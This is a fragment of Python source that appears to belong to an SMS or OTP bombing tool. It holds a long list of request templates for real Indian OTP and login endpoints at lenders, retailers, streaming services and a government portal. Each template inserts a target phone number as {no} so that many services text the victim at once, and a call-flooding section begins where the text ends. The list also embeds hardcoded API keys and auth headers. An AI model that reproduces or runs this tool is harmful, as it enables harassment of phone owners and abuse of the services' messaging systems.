        {"name":"PaisaBoxx","url":"https://api.paisaboxx.com/identity/UserAuth/loginWithMobile","method":"POST","params":{"country_code":"91","mobile":"{no}","partner_id":"6350faa323","source":"hexa","campaign":"delhi_5499"},"headers":{"Content-Type":"application/json","origin":"https://www.paisaboxx.com"},"body":{}},
        {"name":"LoanZap","url":"https://webapi.loanzap.in/v2/apply-loan/register-user","method":"POST","headers":{"Content-Type":"application/json","origin":"https://www.loanzap.in"},"body":{"name":"Binod","mobile":"{no}","email":"test@gmail.com","terms":"1","utm_source":"","utm_campaign":""}},
        {"name":"CashKredit","url":"https://api.cashkredit.in/v2/apply-loan/register-user","method":"POST","headers":{"Content-Type":"application/json","origin":"https://www.cashkredit.in"},"body":{"pan":"ABCDE1234F","name":"Binod","mobile":"{no}","email":"test@gmail.com","terms":"1","utm_source":"","utm_campaign":""}},
        {"name":"RupeeLending","url":"https://rupeelending.com/apply-now/send-otp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://rupeelending.com"},"body":{"mobile":"{no}"}},
        {"name":"BrightLoans","url":"https://brightloans.in/login-sbm","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","origin":"https://brightloans.in"},"body":"mobile={no}&current_page=login&is_existing_customer=2"},
        {"name":"SalaryTopUp","url":"https://salarytopup.in/api/Api/Website/InstantJourneyController/appCustomerRegisteration","method":"POST","headers":{"Content-Type":"application/json","Auth":"MjQ4ZmY5MGM0MmM2N2EyOTJlZWE0MTBiNGU2Y2Q2NzU=","origin":"https://salarytopup.com"},"body":{"mobile":"{no}","event_name":"login"}},
        {"name":"TezCredit","url":"https://api.tezcredit.com/identity/UserAuth/loginWithMobile","method":"POST","params":{"country_code":"91","mobile":"{no}"},"headers":{"Content-Type":"application/json","origin":"https://www.tezcredit.com"},"body":{}},
        {"name":"Univest","url":"https://api.univest.in/api/auth/send-otp","method":"GET","params":{"type":"web4","countryCode":"91","contactNumber":"{no}"},"headers":{"origin":"https://univest.in"},"body":{}},
        {"name":"HeroFinCorp_Festive","url":"https://festive.api.herofincorp.com/v1/customer/otp/{no}","method":"GET","headers":{"origin":"https://festive.herofincorp.com"},"body":{}},
        {"name":"HeroFinCorp_WhatsApp","url":"https://loans.apps.herofincorp.com/api/generateOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","terms":True,"whatsapp":True}},
        {"name":"INRFlash","url":"https://offers.inrflash.com/campinr/index.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","origin":"https://offers.inrflash.com"},"body":"action=send_otp&phoneNo={no}"},
        {"name":"MuthootFinance","url":"https://www.muthootfinance.com/smsapi.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","origin":"https://www.muthootfinance.com"},"body":"mobile={no}&pin=Xmd6TERfO1haXjo3"},
        {"name":"CRMSL","url":"https://api.crmsl.com/Api/Website/InstantJourneyController/appCustomerRegisteration","method":"POST","headers":{"Content-Type":"application/json","Auth":"ZTI4MTU1MzE4NWQ2MGQyZTFhNWM0NGU3M2UzMmM3MDM=","origin":"https://suryaloan.com"},"body":{"mobile":"{no}","event_name":"login"}},
        {"name":"Factori","url":"https://factori.com/login/check_user_exists","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","origin":"https://factori.com"},"body":"mobNumber={no}&countryCode=91"},
        {"name":"ShipRocket2","url":"https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json","origin":"https://www.shiprocket.in"},"body":{"mobileNumber":"{no}"}},
        {"name":"DigiCredit","url":"https://customer-backend.digicredit.in/customers/customer-login","method":"POST","headers":{"Content-Type":"application/json","client-id":"7de19504-f422-42dc-bd51-5ed5dfb170c1","origin":"https://applyloan.digicredit.in"},"body":{"phoneNo":"{no}","journey_down":"true"}},
        {"name":"MyMoneyBazaar","url":"https://mm-app-backend.mymoneybazaar.com/api/v2/authentication/phone_no_verify/","method":"POST","headers":{"Content-Type":"application/json","origin":"https://web.mymoneybazaar.com"},"body":{"phone_number":"{no}"}},
        {"name":"Shopsy","url":"https://www.shopsy.in/1.rome/api/1/action/view","method":"POST","headers":{"Content-Type":"application/json","origin":"https://www.shopsy.in"},"body":{"actionRequestContext":{"loginId":"{no}","loginType":"MOBILE","verificationType":"OTP","type":"LOGIN_IDENTITY_VERIFY"}}},
        {"name":"KamakshiMoney","url":"https://loan-api.kamakshimoney.com/customers/customer-login-byMobile","method":"POST","headers":{"Content-Type":"application/json","origin":"https://loan.kamakshimoney.com"},"body":{"mobile":"{no}"}},
        {"name":"PrimeCash","url":"https://api.primecash.app/api/v1/user","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","isTNCVerified":True,"hash":"O9BmoTki4+6"}},
        {"name":"Allen","url":"https://api.allen-live.in/api/v1/auth/sendOtp","method":"POST","params":{"center_id":"","source":"home-page-login"},"headers":{"Content-Type":"application/json","x-client-type":"mweb","origin":"https://allen.in"},"body":{"country_code":"91","phone_number":"{no}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}},
        {"name":"RupeeCare","url":"https://rc-backend.root.deployment.rupeecare.money/api/auth/get_otp","method":"POST","headers":{"Content-Type":"application/json","client-id":"d8247367-fabd-48c1-8314-ea00b431c232","origin":"https://rupeecare.money"},"body":{"phoneNo":"{no}","clientId":"d8247367-fabd-48c1-8314-ea00b431c232"}},
        {"name":"Rupyalelo","url":"https://apply.rupyalelo.com/api/login","method":"POST","headers":{"Content-Type":"application/json","origin":"https://apply.rupyalelo.com"},"body":{"mobile":"{no}"}},
        {"name":"RoopyaMoney","url":"https://api.roopya.money/api/v2/customer/lead","method":"POST","headers":{"Content-Type":"application/json","apiSecret":"3acd32a5276b6b968028c2e7d6471051d5df9771d9049e2fc317b8e93113bdcc","apiKey":"0025f469f0e293c539a207f2aaaa85c75f1c30191c31c44cc010c3b076ee1216","origin":"https://salarychampion.roopya.money"},"body":{"phone":"{no}","countryCode":"+91","ip":"152.58.58.64"}},
        {"name":"Dhanrishi","url":"https://ub1.dhanrishi.com/api/user/send-otp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://dhanrishi.com"},"body":{"PAN":"ABCDE1234F","phone_number":"{no}"}},
        {"name":"SalaryOnTime","url":"https://journey.sotcrm.com/api/v1/journey-auth/send-otp/","method":"POST","headers":{"Content-Type":"application/json","origin":"https://salaryontime.com"},"body":{"mobile":"{no}","sourceId":1}},
        {"name":"SpeedoLoan","url":"https://loanapply.speedoloan.com/api/login","method":"POST","headers":{"Content-Type":"application/json","origin":"https://loanapply.speedoloan.com"},"body":{"mobile":"{no}"}},
        {"name":"FastSalary","url":"https://apilm.fastsalary.com/api/v2/auth/send-signup","method":"POST","headers":{"Content-Type":"application/json","domain":"app.fastsalary.com"},"body":{"phoneNumber":"+91{no}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"546481","panCard":"GDODJ5434B","brandId":"676027d3-a43c-4716-9663-7272f5df1ac7","domain":"app.fastsalary.com"}},
        {"name":"CredNidhi","url":"https://apilm.crednidhi.com/api/v2/auth/send-signup","method":"POST","headers":{"Content-Type":"application/json","domain":"app.crednidhi.com"},"body":{"phoneNumber":"+91{no}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"50000","panCard":"HSOSN5464B","brandId":"5d8868eb-40e8-47f8-a497-cd2ce6216c4f","domain":"app.crednidhi.com"}},
        {"name":"ClickMyLoan","url":"https://appb.clickmyloan.com/api/v2/authentication/phone_no_verify/","method":"POST","headers":{"Content-Type":"application/json","origin":"https://web.clickmyloan.com"},"body":{"phone_number":"{no}"}},
        {"name":"SuryaLoan","url":"https://microservices.suryaloan.com/api/v1/customer-journey/login","method":"POST","headers":{"Content-Type":"application/json; charset=UTF-8","origin":"https://suryaloan.com"},"body":{"utmSource":"Value_Leaf","mobile":"{no}","sourceId":1}},
        {"name":"SalarySetu","url":"https://backend.salarysetu.com/api/user/send-otp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://salarysetu.com"},"body":{"PAN":"ABCDE1234F","phone_number":"{no}"}},
        {"name":"ShreeLoan","url":"https://loanapply.shreeloan.com/api/login","method":"POST","headers":{"Content-Type":"application/json","origin":"https://loanapply.shreeloan.com"},"body":{"mobile":"{no}"}},
        {"name":"PocketCredit","url":"https://pocketcredit.in/api/auth/send-otp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://pocketcredit.in"},"body":{"mobile":"{no}"}},
        {"name":"ClickForMoney","url":"https://clickformoney.in/api/sendOtp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://clickformoney.in"},"body":{"phone":"{no}"}},
        {"name":"JhatpatCash","url":"https://apilm.jhatpatcash.com/api/v2/auth/send-signup","method":"POST","headers":{"Content-Type":"application/json","domain":"app.jhatpatcash.com"},"body":{"phoneNumber":"+91{no}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"537078","panCard":"GSISB5468H","brandId":"d7c6bc00-9517-4d20-86f7-78b07f18a46d","domain":"app.jhatpatcash.com"}},
        {"name":"QuaLoan","url":"https://apilm.qualoan.com/api/v2/auth/send-signup","method":"POST","headers":{"Content-Type":"application/json","domain":"app.qualoan.com"},"body":{"phoneNumber":"+91{no}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"65000","panCard":"VUJVU5675H","brandId":"4b2f828d-e7d4-45d2-be7d-f2a0ee6a70ae","domain":"app.qualoan.com"}},
        {"name":"NexiLoans","url":"https://api-backend.nexiloans.com/user/otp/send","method":"POST","headers":{"Content-Type":"application/json","origin":"https://apply.nexiloans.com"},"body":{"mobile":"{no}"}},
        {"name":"ToofanLoan","url":"https://apilm.toofanloan.com/api/v2/auth/send-signup","method":"POST","headers":{"Content-Type":"application/json","domain":"app.toofanloan.com"},"body":{"phoneNumber":"+91{no}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"52800","panCard":"TSISV5434B","brandId":"4dd2f611-32b6-42a4-a14b-d493dc885000","domain":"app.toofanloan.com"}},
        {"name":"Rupee4u","url":"https://loanapply.rupee4u.com/api/login","method":"POST","headers":{"Content-Type":"application/json","origin":"https://loanapply.rupee4u.com"},"body":{"mobile":"{no}"}},
        {"name":"PaisaPop","url":"https://apilm.paisapop.com/api/v2/auth/send-signup","method":"POST","headers":{"Content-Type":"application/json","domain":"web.paisapop.com"},"body":{"phoneNumber":"+91{no}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"538355","panCard":"FUOUR2389B","brandId":"165a2d32-d1bd-4287-b2db-104a7feee308","domain":"web.paisapop.com"}},
        {"name":"Figii","url":"https://consumer.figii.in/api/auth/login/","method":"POST","params":{"mobile":"{no}"},"headers":{"Content-Type":"application/json","origin":"https://consumer.figii.in"},"body":{"username":"{no}","medium":"SMS","meta":{}}},
        {"name":"MinutesLoan","url":"https://apilm.minutesloan.com/api/v2/auth/send-signup","method":"POST","headers":{"Content-Type":"application/json","domain":"app.minutesloan.com"},"body":{"phoneNumber":"+91{no}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"55000","panCard":"ABCDE5438F","brandId":"0dbae4da-461a-4959-aa82-6a788de61593","domain":"app.minutesloan.com"}},
        {"name":"AyushmanLoan","url":"https://backend.ayushmanloan.com/api/user/send-otp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://ayushmanloan.com"},"body":{"PAN":"ABCDE1234F","phone_number":"{no}"}},
        {"name":"Creditt","url":"https://prod-v4-app-api.credittapi.com/app/auth/mobile/otp/sent","method":"POST","headers":{"Content-Type":"application/json","appStore":"web_app","api_version":"1.0","appVersion":"1.0.21","platform":"3","origin":"https://loan.credittnow.com"},"body":{"mobile":"{no}"}},
        {"name":"FundsBull","url":"https://backend.fundsbull.com/api/user/send-otp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://fundsbull.com"},"body":{"phone_number":"{no}"}},
        {"name":"F1SpeedLoan","url":"https://backend.f1speedloan.com/api/user/send-otp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://f1speedloan.com"},"body":{"PAN":"ABCDE1234F","phone_number":"{no}"}},
        {"name":"FundoBaba","url":"https://backend.fundobaba.com/api/user/send-otp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://fundobaba.com"},"body":{"PAN":"ABCDE1234F","phone_number":"{no}"}},
        {"name":"RupeeRedee","url":"https://webservice-in-prod.rupeeredee.com/gate/api/v1/OTP","method":"POST","headers":{"Content-Type":"application/json","platform":"Web","origin":"https://www.rupeeredee.com"},"body":{"number":"+91{no}","type":"Mobile"}},
        {"name":"UdhaarPortal","url":"https://crm.udhaarportal.com/api/Api/Website/InstantJourneyController/appCustomerRegisteration","method":"POST","headers":{"Content-Type":"application/json; charset=UTF-8","Auth":"ZTI4MTU1MzE4NWQ2MGQyZTFhNWM0NGU3M2UzMmM3MDM=","origin":"https://www.udhaarportal.com"},"body":{"mobile":"{no}","event_name":"login"}},
        {"name":"DuniyaFinance","url":"https://backend.duniyafinance.in/api/user/send-otp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://duniyafinance.com"},"body":{"PAN":"ABCDE1234F","phone_number":"{no}"}},
        {"name":"BlinkrLoan","url":"https://backend.blinkrloan.com/api/user/v3/send-otp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://www.blinkrloan.com"},"body":{"PAN":"ABCDE1234F","phone_number":"{no}","lat":"26.123456","lng":"77.123456","url":"https://www.blinkrloan.com/apply/pan-mobile"}},
        {"name":"NaukriLoans","url":"https://backend.naukriloans.com/api/user/send-otp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://naukriloans.com"},"body":{"PAN":"ABCDE1234F","phone_number":"{no}"}},
        {"name":"UdharCapital","url":"https://www.udharcapital.com/api/send_otp.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","origin":"https://www.udharcapital.com"},"body":"phone={no}"},
        {"name":"SalaryBolt","url":"https://backend.salarybolt.com/api/user/send-otp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://salarybolt.com"},"body":{"PAN":"ABCDE1234F","phone_number":"{no}"}},
        {"name":"SabkaLoan","url":"https://api.sabkaloan.com/api/send-otp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://sabkaloan.com"},"body":{"mobile":"{no}"}},
        {"name":"PaisaInTime","url":"https://micro-server-for-paisaintime-nrbe5.ondigitalocean.app/api/auth/get_otp","method":"POST","headers":{"Content-Type":"application/json","client-id":"08b61f94-4e99-4d4e-abe9-108a1078bbdb","origin":"https://www.paisaintime.com"},"body":{"phoneNo":"{no}","clientId":"08b61f94-4e99-4d4e-abe9-108a1078bbdb"}},
        {"name":"FastPaise","url":"https://backend.fastpaise.in/api/user/send-otp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://fastpaise.in"},"body":{"PAN":"ABCDE1234F","phone_number":"{no}"}},
        {"name":"OTPBomber","url":"https://otpbomber-40jd.onrender.com/api/bomb","method":"POST","headers":{"Content-Type":"application/json","origin":"https://otpbomber-40jd.onrender.com"},"body":{"phone":"{no}","ip":"192.168.1.1","iterations":2}},
        {"name":"RamFincorp","url":"https://loan-api.ramfincorp.com/customers/customer-login-byMobile","method":"POST","headers":{"Content-Type":"application/json","origin":"https://loan.ramfincorp.com"},"body":{"mobile":"{no}"}},
        {"name":"InCred","url":"https://gateway-api.incred.com/website-bff/public/v1/common/login/otpgenerate","method":"POST","headers":{"Content-Type":"application/json","origin":"https://www.incred.com"},"body":{"MOBILE":"{no}","UTM_DETAILS":{"partnerId":"9250608873861026P"},"ON_BOARDING_TYPE":"FROM_LOAN_ENQUIRY","STATUS":"Pending"}},
        {"name":"Cashvia","url":"https://customer-backend.cashvia.in/customers/customer-login","method":"POST","headers":{"Content-Type":"application/json","client-id":"7de19504-f422-42dc-bd51-5ed5dfb170c1","origin":"https://applynow.cashvia.in"},"body":{"phoneNo":"{no}","journey_down":True}},
        {"name":"RojgarKaro_SendOTP","url":"https://rojgarkaro.in/api/auth/sendOTP","method":"POST","headers":{"Content-Type":"application/json","origin":"https://rojgarkaro.in"},"body":{"mobile_no":"{no}","isSessionActive":False}},
        {"name":"RojgarKaro_Signup","url":"https://rojgarkaro.in/api/auth/sendOTPOnSignup","method":"POST","headers":{"Content-Type":"application/json","origin":"https://rojgarkaro.in"},"body":{"mobile_no":"{no}","email_id":"test@gmail.com","isSessionActive":False}},
        {"name":"BajajFinserv","url":"https://apigateway.bajajfinserv.in/apigateway/otp/sso","method":"POST","headers":{"Content-Type":"application/json","origin":"https://www.bajajfinserv.in"},"body":{"mobileNumber":"{no}","source":"WEB"}},
        {"name":"TataCliq","url":"https://www.tatacliq.com/api/v1/otp/send","method":"POST","headers":{"Content-Type":"application/json","origin":"https://www.tatacliq.com"},"body":{"mobile":"{no}","state":"login"}},
        {"name":"Licious_SMS","url":"https://www.licious.com/auth/api/v1/sendOtp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://www.licious.com"},"body":{"mobile":"{no}","countryCode":"+91"}},
        {"name":"CureFoods_SMS","url":"https://web.curefoods.com/api/v2/auth/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","country_code":"+91"}},
        {"name":"Puma_SMS","url":"https://in.puma.com/on/demandware.store/Sites-IN-Site/en_IN/Login-OtpRegistration","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"dwfrm_phone={no}&format=ajax"},
        {"name":"Decathlon_SMS","url":"https://www.decathlon.in/api/v1/auth/sendOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","isLogin":True}},
        {"name":"McDonalds_SMS","url":"https://mcdelivery.mcdonaldsindia.com/api/v1/customer/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phoneNumber":"{no}","source":"web"}},
        {"name":"Dominos_SMS","url":"https://pizzaonline.dominos.co.in/api/v1/auth/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","source":"WEB"}},
        {"name":"Zivame_SMS","url":"https://www.zivame.com/auth/public/v1/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","countryCode":"IN"}},
        {"name":"FirstCry_SMS","url":"https://www.firstcry.com/api/v2/auth/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Upstox_SMS","url":"https://api.upstox.com/v2/login/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","client_id":"UPSTOX"}},
        {"name":"Zerodha_SMS","url":"https://kite.zerodha.com/api/login","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"user_id={no}"},
        {"name":"Groww_SMS","url":"https://groww.in/api/v2/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","platform":"WEB"}},
        {"name":"SonyLiv_SMS_v2","url":"https://www.sonyliv.com/api/v1/auth/sendOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","countryCode":"+91"}},
        {"name":"Furlenco_SMS","url":"https://www.furlenco.com/api/v1/auth/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","term":"true"}},
        {"name":"CityFurnish_SMS","url":"https://www.cityfurnish.com/api/v1/auth/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Ixigo_Alt_SMS","url":"https://www.ixigo.com/api/v2/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","countryCode":"+91"}},
        {"name":"EaseMyTrip_SMS","url":"https://www.easemytrip.com/api/otp/SendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"Mobileno":"{no}","Type":"M"}},
        {"name":"Goibibo_SMS","url":"https://www.goibibo.com/api/v2/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","countryCode":"+91"}},
        {"name":"RedBus_SMS_Alt","url":"https://www.redbus.in/api/v2/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","source":"web"}},
        {"name":"RedBus_WhatsApp","url":"https://www.redbus.in/hotels/api/sendOtpV2","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phoneCode":"91","mobile":"{no}","whatsappOptin":True,"reCaptchaResponse":"dummy"}},
        {"name":"Rapido_SMS2_Alt","url":"https://rapido.bike/api/v1/otp/generate","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","source":"SMS"}},
        {"name":"Jockey_SMS","url":"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{no}","method":"GET","params":{"whatsapp":"false"},"headers":{"Referer":"https://www.jockey.in/"},"body":{}},
        {"name":"Jockey_WhatsApp","url":"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{no}","method":"GET","params":{"whatsapp":"true"},"headers":{"Referer":"https://www.jockey.in/"},"body":{}},
        {"name":"Vyapar_SMS","url":"https://vyaparapp.in/api/ftu/v3/send/otp","method":"GET","params":{"country_code":"91","mobile":"{no}"},"headers":{},"body":{}},
        {"name":"ConfirmTkt_SMS","url":"https://securedapi.confirmtkt.com/api/platform/registerOutput","method":"GET","params":{"mobileNumber":"{no}","newOtp":"true","retry":"false","channel":"web"},"headers":{},"body":{}},
        {"name":"CodFirm_SMS","url":"https://api.codfirm.in/api/customers/login/otp","method":"GET","params":{"medium":"sms","phoneNumber":"+91{no}","email":"","storeUrl":"bellavita1.myshopify.com"},"headers":{},"body":{}},
        {"name":"Coolwinks_SMS","url":"https://api.coolwinks.com/api/accounts/is_already_registered/","method":"GET","params":{"username":"{no}"},"headers":{},"body":{}},
        {"name":"Zee5_SMS","url":"https://b2bapi.zee5.com/device/sendotp_v1.php","method":"GET","params":{"phoneno":"{no}"},"headers":{},"body":{}},
        {"name":"MyGov_SMS","url":"https://auth.mygov.in/regapi/register_api_ver1/","method":"GET","params":{"api_key":"57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b","name":"raj","email":"","gateway":"91","mobile":"{no}","gender":"male"},"headers":{},"body":{}},
        {"name":"AstroSage_SMS","url":"https://vartaapi.astrosage.com/sdk/registerAS","method":"GET","params":{"operation_name":"signup","countrycode":"91","pkgname":"com.ojassoft.astrosage","appversion":"23.7","lang":"en","deviceid":"android123","regsource":"AK_Varta user app","key":"-787506999","phoneno":"{no}"},"headers":{},"body":{}},
        {"name":"TooToo_SMS","url":"https://tootoo.in/graphql","method":"POST","headers":{"Content-Type":"application/json"},"body":{"query":"query sendOtp($mobile_no: String!, $resend: Int!) { sendOtp(mobile_no: $mobile_no, resend: $resend) { success __typename } }","variables":{"mobile_no":"{no}","resend":0}}},
        {"name":"HappyEasyGo_SMS","url":"https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do","method":"GET","params":{"phone":"91 {no}"},"headers":{},"body":{}},
        {"name":"JustDial_OTP","url":"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php","method":"GET","params":{"mobile":"{no}"},"headers":{},"body":{}},
        {"name":"AllenSolly_OTP","url":"https://www.allensolly.com/capillarylogin/validateMobileOrEMail","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobileoremail":"{no}","name":"markluther"}},
        {"name":"Frotels_OTP","url":"https://www.frotels.com/appsendsms.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"mobno={no}"},
        {"name":"Gapoon_OTP","url":"https://www.gapoon.com/userSignup","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","email":"noreply@gmail.com","name":"LexLuthor"}},
        {"name":"Porter_OTP","url":"https://porter.in/restservice/send_app_link_sms","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","referrer_string":"","brand":"porter"}},
        {"name":"Cityflo_OTP","url":"https://cityflo.com/website-app-download-link-sms/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile_number":"{no}"}},
        {"name":"NNNOW_OTP","url":"https://api.nnnow.com/d/api/appDownloadLink","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobileNumber":"{no}"}},
        {"name":"AJIO_OTP","url":"https://login.web.ajio.com/api/auth/signupSendOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"firstName":"xxps","login":"wiqpdl223@wqew.com","password":"QASpw@1s","genderType":"Male","mobileNumber":"{no}","requestType":"SENDOTP"}},
        {"name":"Treebo_OTP","url":"https://www.treebo.com/api/v2/auth/login/otp/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone_number":"{no}"}},
        {"name":"Airtel_OTP","url":"https://www.airtel.in/referral-api/core/notify","method":"GET","params":{"messageId":"map","rtn":"{no}"},"headers":{},"body":{}},
        {"name":"MylesCars_OTP","url":"https://www.mylescars.com/usermanagements/chkContact","method":"POST","headers":{"Content-Type":"application/json"},"body":{"contactNo":"{no}"}},
        {"name":"Grofers_OTP","url":"https://grofers.com/v2/accounts/","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"user_phone={no}"},
        {"name":"Cashify_OTP","url":"https://www.cashify.in/api/cu01/v1/app-link","method":"GET","params":{"mn":"{no}"},"headers":{},"body":{}},
        {"name":"KFCIndia_OTP","url":"https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin","method":"POST","headers":{"Content-Type":"application/json","Referer":"https://online.kfc.co.in/login"},"body":{"AuthorizedFor":"3","phoneNumber":"{no}","Resend":"false"}},
        {"name":"Flipkart_OTP","url":"https://www.flipkart.com/api/5/user/otp/generate","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","X-user-agent":"Mozilla/5.0 FKUA/website/41/website/Desktop"},"body":"loginId=+91{no}"},
        {"name":"Flipkart_OTP_v2","url":"https://2.rome.api.flipkart.com/1/action/view","method":"POST","headers":{"X-User-Agent":"Mozilla/5.0 FKUA/msite/0.0.3/msite/Mobile","Content-Type":"application/json"},"body":{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"{no}","clientQueryParamMap":{"ret":"/my-account","entryPage":"DEFAULT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","triggerSna":False,"sourceContext":"DEFAULT"}}},
        {"name":"RedBus_SMS_v3","url":"https://m.redbus.in/api/getOtp","method":"GET","params":{"number":"{no}","cc":"91","whatsAppOpted":"false"},"headers":{},"body":{}},
        {"name":"Hotstar_OTP","url":"https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register","method":"PUT","params":{"register-by":"phone_otp"},"headers":{"Content-Type":"application/json","x-country-code":"IN","X-HS-Platform":"mweb"},"body":{"phone_number":"{no}","country_prefix":"91"}},
        {"name":"AltBalaji_OTP","url":"https://api.cloud.altbalaji.com/accounts/mobile/verify","method":"POST","params":{"domain":"IN"},"headers":{"Content-Type":"application/json"},"body":{"phone_number":"{no}","country_code":"91","platform":"web"}},
        {"name":"Voot_OTP","url":"https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser","method":"POST","headers":{"Content-Type":"application/json;charset=UTF-8"},"body":{"type":"mobile","mobile":"{no}","countryCode":"+91"}},
        {"name":"SonyLIV_OTP_alt","url":"https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"channelPartnerID":"MSMIND","mobileNumber":"{no}","country":"IN"}},
        {"name":"Samsung_OTP","url":"https://www.samsung.com/in/api/v1/sso/otp/init","method":"POST","headers":{"Content-Type":"application/json"},"body":{"user_id":"{no}"}},
        {"name":"SamsungIndia_OTP","url":"https://www.samsung.com/in/api/v1/sso/otp/init","method":"POST","headers":{"Content-Type":"application/json"},"body":{"user_id":"{no}"}},
        {"name":"MuscleBlaze2","url":"https://www.muscleblaze.com/veronica/user/validate/9/{no}/signup","method":"GET","params":{"plt":"2","st":"9"},"headers":{"HKAUTH":"396144437|9l7fQT5m5HJtTrXqRZiWdQ==","pageuri":"/","st":"9","plt":"2"},"body":{}},
        {"name":"MuscleBlaze3","url":"https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{no}/signup","method":"GET","params":{"plt":"2","st":"9"},"headers":{"HKAUTH":"396144437|9l7fQT5m5HJtTrXqRZiWdQ==","pageuri":"/","st":"9","plt":"2"},"body":{}},
        {"name":"MuscleBlaze","url":"https://www.muscleblaze.com/veronica/user/validate/9/{no}/signup","method":"GET","params":{"plt":"2","st":"9"},"headers":{"origin":"https://www.muscleblaze.com","HKAUTH":"396144437|9l7fQT5m5HJtTrXqRZiWdQ==","pageuri":"/","st":"9","plt":"2"},"body":{}},
        {"name":"MuscleBlaze_WhatsApp","url":"https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{no}/signup","method":"GET","params":{"plt":"2","st":"9"},"headers":{"HKAUTH":"396144437|9l7fQT5m5HJtTrXqRZiWdQ==","pageuri":"/","st":"9","plt":"2"},"body":{}},
        {"name":"CreditSea2","url":"https://backend.creditsea.com/api/v1/otp/generate-otp","method":"POST","headers":{"Content-Type":"application/json","platform":"CREDITSEA"},"body":{"phoneNumber":"{no}","fromLoginPage":True,"isWebUser":True}},
        {"name":"CreditSea","url":"https://backend.creditsea.com/api/v1/otp/generate-otp","method":"POST","headers":{"Content-Type":"application/json","platform":"CREDITSEA","origin":"https://www.creditsea.com"},"body":{"phoneNumber":"{no}","isWebUser":True}},
        {"name":"Samsung_OTP_v2","url":"https://www.samsung.com/in/api/v1/sso/otp/init","method":"POST","headers":{"Content-Type":"application/json"},"body":{"user_id":"{no}"}},
        {"name":"SamsungIndia_OTP_v2","url":"https://www.samsung.com/in/api/v1/sso/otp/init","method":"POST","headers":{"Content-Type":"application/json"},"body":{"user_id":"{no}"}}
    ]
    apis.extend(sms)

    # ========== CALL APIs ==========
    call = [
